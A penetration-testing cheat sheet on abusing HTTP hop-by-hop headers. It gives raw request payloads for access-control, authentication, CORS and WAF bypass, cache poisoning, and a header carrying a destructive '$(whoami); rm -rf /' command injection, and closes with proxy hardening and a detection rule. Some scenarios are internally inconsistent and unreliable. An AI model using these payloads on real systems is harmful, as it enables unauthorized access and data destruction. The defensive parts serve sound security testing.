## 1. Overview (Theory)

### What Are Hop-by-Hop Headers?

Hop-by-hop headers are HTTP headers specific to a single transport-level connection between two nodes (like client-proxy or proxy-server). These headers manage connection-specific data and are **not meant to be forwarded** beyond the immediate connection.

**Standard Hop-by-Hop Headers** (defined in [RFC 2616](https://tools.ietf.org/html/rfc2616#section-13.5.1)):

- `Keep-Alive`
- `Transfer-Encoding`
- `TE`
- `Connection`
- `Trailer`
- `Upgrade`
- `Proxy-Authorization`
- `Proxy-Authenticate`

### The Connection Header Mechanism

The `Connection` header allows you to designate **any custom header** as hop-by-hop:

```http
Connection: close, X-Custom-Header
```

This tells the proxy to treat `X-Custom-Header` as hop-by-hop and remove it before forwarding the request.

### The Vulnerability

**Security Issue:** When proxies fail to properly strip hop-by-hop headers, attackers can manipulate which headers reach the backend application, leading to:

- Security control bypasses
- Cache poisoning
- Authentication bypass
- Access control circumvention

---

## 2. Exploitation Methods

### 🎯 Testing Strategy

**Step 1: Identify Proxy Presence**

```bash
# Check for proxy-specific headers in responses
curl -I https://target.com
# Look for: X-Cache, Via, X-Proxy, etc.
```

**Step 2: Test Hop-by-Hop Header Handling**

```http
GET / HTTP/1.1
Host: target.com
X-Test-Header: vulnerable
Connection: close, X-Test-Header
```

**Expected Behavior:** Backend should NOT receive `X-Test-Header`  
**Vulnerable Behavior:** Backend receives and processes `X-Test-Header`

**Step 3: Automate Detection**

Create a baseline request, then test with hop-by-hop designation:

```python
import requests

# Baseline request
baseline = requests.get('https://target.com/endpoint')

# Test with hop-by-hop header
headers = {
    'X-Test-Header': 'testvalue',
    'Connection': 'close, X-Test-Header'
}
test = requests.get('https://target.com/endpoint', headers=headers)

# Compare responses for differences
if baseline.text != test.text:
    print("Proxy may be mishandling hop-by-hop headers!")
```

### 🔍 Systematic Testing Workflow

**Quick Checklist:**

- [ ] Map all proxy infrastructure
- [ ] Identify security-critical headers
- [ ] Test each header with Connection directive
- [ ] Document proxy behavior patterns
- [ ] Develop targeted exploits

---

## 3. Bypasses

### Bypass #1: IP-Based Access Controls via X-Forwarded-For

**Scenario:** Application trusts `X-Forwarded-For` for IP whitelisting

**Attack Steps:**

1. **Normal Request (Blocked):**

```http
GET /admin HTTP/1.1
Host: target.com
X-Forwarded-For: 1.2.3.4
```

2. **Bypass Request:**

```http
GET /admin HTTP/1.1
Host: target.com
X-Forwarded-For: 192.168.1.1
Connection: close, X-Forwarded-For
```

**Result:** Proxy removes `X-Forwarded-For`, backend sees request as coming from proxy's IP (potentially trusted)

### Bypass #2: Authentication Header Removal

**Target:** Applications using custom authentication headers

**Attack:**

```http
GET /api/sensitive HTTP/1.1
Host: target.com
X-API-Key: invalid_key
Connection: close, X-API-Key
```

**Result:** Backend receives no `X-API-Key`, may default to permissive behavior

### Bypass #3: Security Header Circumvention

**Target:** WAF/security controls checking specific headers

**Attack:**

```http
POST /vulnerable-endpoint HTTP/1.1
Host: target.com
X-Security-Token: <malicious_payload>
Connection: close, X-Security-Token
```

**Result:** Security token validation bypassed as header never reaches backend

### Bypass #4: Cookie Header Manipulation

**Attack:**

```http
GET /user/profile HTTP/1.1
Host: target.com
Cookie: session=attacker_session
Connection: close, Cookie
```

**Result:** Potential session confusion or default session assignment

---

## 4. Payloads

### Payload #1: X-Forwarded-For Bypass

```http
GET /admin/dashboard HTTP/1.1
Host: target.com
X-Forwarded-For: 127.0.0.1
Connection: close, X-Forwarded-For
```

### Payload #2: Authorization Header Removal

```http
GET /api/v1/users HTTP/1.1
Host: target.com
Authorization: Bearer fake_token
Connection: close, Authorization
```

### Payload #3: X-Real-IP Spoofing

```http
GET /internal/metrics HTTP/1.1
Host: target.com
X-Real-IP: 10.0.0.1
Connection: close, X-Real-IP
```

### Payload #4: Custom Authentication Bypass

```http
POST /secure/action HTTP/1.1
Host: target.com
X-API-Key: invalid_key_12345
Connection: close, X-API-Key
```

### Payload #5: Rate Limiting Bypass

```http
GET /api/endpoint HTTP/1.1
Host: target.com
X-RateLimit-Bypass: true
Connection: close, X-RateLimit-Bypass
```

### Payload #6: Host Header Manipulation

```http
GET /password-reset HTTP/1.1
Host: target.com
X-Forwarded-Host: attacker.com
Connection: close, X-Forwarded-Host
```

### Payload #7: Origin Header Removal (CORS Bypass)

```http
GET /api/data HTTP/1.1
Host: target.com
Origin: https://evil.com
Connection: close, Origin
```

### Payload #8: Referer Header Stripping

```http
GET /csrf-protected HTTP/1.1
Host: target.com
Referer: https://malicious-site.com
Connection: close, Referer
```

### Payload #9: User-Agent Filtering Bypass

```http
GET /endpoint HTTP/1.1
Host: target.com
User-Agent: <script>alert(1)</script>
Connection: close, User-Agent
```

### Payload #10: Content-Type Manipulation

```http
POST /upload HTTP/1.1
Host: target.com
Content-Type: application/json
Connection: close, Content-Type

malicious_payload
```

---

## 5. Higher Impact Scenarios

### 🚀 Scenario #1: Cache Poisoning Attack

**Impact Level:** CRITICAL

**Attack Flow:**

1. **Inject Poisoned Request:**

```http
GET /static/homepage.html HTTP/1.1
Host: target.com
Cookie: admin_session=xyz123
Connection: close, Cookie
```

2. **Misconfigured Cache Behavior:**
    
    - Cache server fails to strip hop-by-hop header
    - Caches response specific to attacker's session
    - Cache key includes Cookie header value
3. **Victim Impact:**
    
    - Future users request `/static/homepage.html`
    - Receive cached response with attacker's session context
    - Potential session hijacking or sensitive data exposure

**Detection Method:**

```bash
# Send poisoning request
curl -H "X-Poison: malicious" -H "Connection: close, X-Poison" https://target.com/resource

# Check if poisoned cache served to others
curl https://target.com/resource
```

### 🎯 Scenario #2: Authentication System Bypass

**Impact Level:** HIGH

**Attack Context:** Multi-tier application with proxy-level and application-level auth

**Exploitation:**

1. **Proxy expects header:**

```http
GET /internal/admin HTTP/1.1
Host: target.com
X-Internal-Auth: proxy_secret_key
Connection: close, X-Internal-Auth
```

2. **Backend logic flaw:**
    - Backend checks if `X-Internal-Auth` exists
    - Missing header = assumed valid (trust proxy)
    - Attacker bypasses entire authentication layer

### 💣 Scenario #3: WAF/Security Control Evasion

**Impact Level:** HIGH

**Setup:** WAF inspects specific headers for attack patterns

**Attack:**

```http
POST /api/command HTTP/1.1
Host: target.com
X-Command: $(whoami); rm -rf /
Connection: close, X-Command
```

**Result:**

- WAF never sees malicious `X-Command` header
- Backend processes command injection payload
- Complete security control bypass

### 🔥 Scenario #4: Access Control Manipulation

**Impact Level:** CRITICAL

**Architecture:** Application uses `X-User-Role` for authorization

**Normal Request:**

```http
GET /admin/delete-user HTTP/1.1
Host: target.com
X-User-Role: standard_user
```

_Response:_ 403 Forbidden

**Attack Request:**

```http
GET /admin/delete-user HTTP/1.1
Host: target.com
X-User-Role: guest
Connection: close, X-User-Role
```

**Backend Logic Flaw:**

- Missing role header defaults to `admin`
- Privilege escalation achieved
- Full administrative access granted

---

## 6. Mitigations

### 🛡️ Proxy Configuration

**Action Steps:**

1. **Explicitly Strip Hop-by-Hop Headers**

```nginx
# Nginx example
proxy_set_header Connection "";
proxy_set_header Keep-Alive "";
proxy_set_header Proxy-Authenticate "";
proxy_set_header Proxy-Authorization "";
proxy_set_header TE "";
proxy_set_header Trailers "";
proxy_set_header Transfer-Encoding "";
proxy_set_header Upgrade "";
```

2. **Parse and Remove Connection-Designated Headers**

```apache
# Apache mod_headers
RequestHeader unset Connection
RequestHeader unset Keep-Alive
```

3. **Whitelist Forwarding Headers**

- Only forward explicitly approved headers
- Never trust `Connection` header from clients

### 🔒 Application-Level Defenses

**Critical Controls:**

1. **Never Trust Proxy Headers Blindly**

```python
# Bad practice
user_ip = request.headers.get('X-Forwarded-For')

# Better practice
def get_client_ip(request):
    if is_trusted_proxy(request.remote_addr):
        return request.headers.get('X-Forwarded-For', request.remote_addr)
    return request.remote_addr
```

2. **Implement Defense-in-Depth**
    
    - Don't rely solely on header presence/absence
    - Use multiple authentication factors
    - Validate all security-critical headers at application layer
3. **Default-Deny Authorization**
    

```python
# Bad: Missing header = access granted
if 'X-User-Role' not in headers:
    role = 'admin'  # VULNERABLE!

# Good: Missing header = access denied
role = headers.get('X-User-Role', 'anonymous')
if role not in ALLOWED_ROLES:
    return 403
```

### 🔍 Monitoring & Detection

**Key Metrics to Track:**

- [ ] Requests with `Connection` header containing non-standard values
- [ ] Inconsistent header patterns between proxy and application logs
- [ ] Unexpected authenticated requests without auth headers
- [ ] Cache hit rates on user-specific content

**Detection Rule Example:**

```yaml
# SIEM rule for hop-by-hop abuse
alert http any any -> any any (
  msg:"Suspicious Connection header manipulation";
  flow:established,to_server;
  content:"Connection|3a 20|";
  pcre:"/Connection:\s*[^,]+,[^,]+/i";
  classtype:web-application-attack;
)
```

### 📋 Security Testing Checklist

**Before Deployment:**

- [ ] Verify proxy strips all standard hop-by-hop headers
- [ ] Test with custom Connection header values
- [ ] Validate backend behavior with missing security headers
- [ ] Review cache configuration for header handling
- [ ] Perform penetration testing on proxy infrastructure
- [ ] Document all trusted proxy relationships

**Pro Tip:** Test in staging with the same proxy configuration as production. Small differences can create exploitable gaps! 🎯

---

**Reference:** [Abusing HTTP Hop-by-Hop Request Headers](https://nathandavison.com/blog/abusing-http-hop-by-hop-request-headers)